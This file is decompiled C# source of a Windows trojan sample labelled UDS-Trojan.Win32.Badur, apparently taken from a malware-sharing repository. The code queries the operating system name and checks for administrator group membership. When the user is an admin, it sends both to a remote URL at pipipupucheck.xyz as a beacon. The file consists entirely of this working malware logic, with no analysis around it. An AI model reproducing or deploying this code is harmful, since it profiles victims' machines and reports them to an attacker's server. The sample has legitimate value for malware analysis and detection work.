// Decompiled with JetBrains decompiler
// Type: testApp.Program
// Assembly: testApp, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97FC35F8-E0A0-4291-8C9A-11639803FECF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\UDS-Trojan.Win32.Badur-83f404f39bd7d21dce339db10327f8dbede9bc19f7f51df513bc4075a1f3d40c.exe

using System;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Claims;
using System.Security.Principal;

namespace testApp
{
  internal class Program
  {
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    [STAThread]
    private static void Main()
    {
      string os = Program.GetOS();
      if (!Program.IsCurrentUserInAdminGroup())
        return;
      Program.Get("http://pipipupucheck.xyz/log.php?os=" + os + "&isAdmin=yes");
    }

    public static string GetOS()
    {
      string os = "Unknown";
      try
      {
        string empty = string.Empty;
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            os = enumerator.Current["Caption"].ToString();
        }
      }
      catch
      {
      }
      return os;
    }

    public static string Get(string url)
    {
      try
      {
        return new StreamReader(WebRequest.Create(url).GetResponse().GetResponseStream()).ReadToEnd();
      }
      catch
      {
      }
      return (string) null;
    }

    private static bool IsCurrentUserInAdminGroup()
    {
      foreach (Claim claim in new WindowsPrincipal(WindowsIdentity.GetCurrent()).Claims)
      {
        if (claim.Value != null && claim.Value.Contains("S-1-5-32-544"))
          return true;
      }
      return false;
    }
  }
}
